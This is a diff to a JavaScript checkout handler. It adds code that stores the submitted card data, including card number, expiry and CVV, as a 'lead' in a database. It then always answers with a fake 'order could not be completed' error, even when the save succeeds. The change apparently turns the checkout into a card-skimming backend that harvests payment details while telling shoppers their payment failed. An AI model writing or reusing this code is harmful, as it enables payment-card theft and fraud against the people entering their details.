@@ -3,7 +3,9 @@ const { isValidUSState }                   = require("../../utils/stateCheckerFo
 const { isValidUSCity }                    = require("../../utils/cityCheckerForUS");
 const { normalizeAddress, isValidAddress } = require("../../utils/addressNormalize");
 
-const checkout = (req, res, next) => 
+const { addLead } = require("../../database/services/leads");
+
+const checkout = async(req, res, next) => 
 {
     try 
     {
@@ -113,15 +115,11 @@ const checkout = (req, res, next) =>
             cardExpYear: cardDetails["Card Expiry Year"],
             cardCVV: cardDetails["Card CVV/CVC"],
         };
-        //console.log(data)
-        return res.json(
-        {
-            success: true,
-            billing: b,
-            shipping,
-            cardDetails,
-            cardMeta: { brand: cardValidation.brand, last4: cardDetails['Card Number'].slice(-4) },
-        });
+
+        let addLeadToDB = await addLead(data)
+
+        if(addLeadToDB) res.status(400).json({ error: {"Order":"Your order could not be completed, please try again"} });
+        else res.status(400).json({ error: {"Order":"There was some error, please try again later"} });
 
     } 
     catch (err) { next(err) }
